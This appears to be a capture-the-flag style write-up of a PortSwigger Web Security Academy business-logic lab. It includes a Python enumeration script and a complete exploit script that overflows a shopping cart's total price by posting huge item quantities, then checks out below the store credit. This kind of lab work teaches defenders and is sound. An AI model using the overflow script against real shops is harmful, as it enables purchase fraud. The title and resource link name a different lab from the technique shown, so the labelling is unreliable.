--- 
title: "Inconsistent Handling of Exceptional Input"
author: ""
date: 2024-06-01T18:03:29+01:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
#### Entities
Asset: https://0a4c001e030d58a4847c65e80013002f.web-security-academy.net

#### Enumeration
Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page, then request all embedded links via Burp proxy using the scripts below.

```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://0a4c001e030d58a4847c65e80013002f.web-security-academy.net"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
content = BeautifulSoup(requests.get(base_url).text, 'html.parser')
for link in content.find_all('a', href=True):
  full_url = urljoin(base_url,link['href'])
  response = requests.get(full_url, proxies=proxies, verify=False)
  print(f"{response.status_code} {response.url}")
for img in content.find_all('img', src=True):
  full_url = urljoin(base_url,img['src'])
  response = requests.get(full_url, proxies=proxies, verify=False)
  print(f"{response.status_code} {response.url}")
```

![Enumeration](/images/bizlogic6/01-enumerate-inconsistent-handling-of-exceptional-input.png "Enumeration")  

#### Exploration
Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, perform a user flow for purchasing an item after logging in with the provided user credential  `wiener:peter`.  The `/login` when requested with valid credentials makes a POST request with `csrf`, `username` and `password` parameters. 

![Exploration](/images/bizlogic6/02-explore-inconsistent-handling-of-exceptional-input.png "Exploration") 

#### Exploitation
Observe a POST request  to `/cart`  with `productId`,`redir`, and `quantity` parameters. When we can manipulate the `quantity` parameter we notice that we can purchase absurd number of items which causes an [integer overflow](https://www.invicti.com/learn/integer-overflow/) at some point. We exploit this by tactically by adding various item to force the total price below the store credit. Doing this manually is extremely laborious thus exploit it using the script below
```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define Variables
base_url = 'https://0a4c001e030d58a4847c65e80013002f.web-security-academy.net/'
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get CSRF Token
def get_csrf_token(session, url):
  response = session.get(url, proxies=proxies, verify=False)
  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
  return csrf_token

# Get Items Total Price
def get_total(session):
  cart_url = urljoin(base_url, 'cart')
  response = session.get(cart_url, proxies=proxies, verify=False)
  soup = BeautifulSoup(response.content, 'html.parser')
  total_element = soup.find('th', string='Total:')
  if total_element:
    total_text = total_element.find_next_sibling('th').text
    total_value = total_text.replace('$', '')
    return float(total_value)
  else:
    return None

# Purchase Item
def purchase_item(session, url):
  # Login
  login_url = urljoin(base_url, 'login')
  login_csrf_token = get_csrf_token(session, login_url)
  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)

  if login_response.status_code == 200:
    cart_url = urljoin(base_url, 'cart')
    
    while True:
      # Add first item
      cart_payload1 = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '99'}
      session.post(cart_url, data=cart_payload1, proxies=proxies, verify=False)

      # Check total
      total = get_total(session)
      if -70000 < total < 0:
        break

    while True:
      # Add second item
      cart_payload2 = {'productId': '2', 'redir': 'PRODUCT', 'quantity': '58'}
      session.post(cart_url, data=cart_payload2, proxies=proxies, verify=False)

      # Check total again
      total = get_total(session)
      if -4000 < total < 100:
        break

    while True:
      # Add third item
      cart_payload3 = {'productId': '3', 'redir': 'PRODUCT', 'quantity': '17'}
      session.post(cart_url, data=cart_payload3, proxies=proxies, verify=False)

      # Check total again
      total = get_total(session)
      if 0 < total < 100:
        # Checkout
        checkout_url = urljoin(base_url, 'cart/checkout')
        checkout_csrf_token = get_csrf_token(session, cart_url)
        checkout_payload = {'csrf': checkout_csrf_token}
        checkout_response = session.post(checkout_url, data=checkout_payload, proxies=proxies, verify=False)
        if checkout_response.status_code == 200:
          print("Purchase successful!")
        else:
          print("Failed to checkout.")
        break

  else:
    print("Failed to log in.")

def main():
  session = requests.Session()
  purchase_item(session, base_url)

if __name__ == "__main__":
  main()
```
![Exploitation](/images/bizlogic6/03-exploit-inconsistent-handling-of-exceptional-input.png "Exploitation") 

![Solution](/images/bizlogic6/04-lab-solution.png "Solution")   

#### Resources
- https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input
- https://github.com/knoxknot/portswigger/tree/main/business-logic/06-inconsistent-handling-of-exceptional-input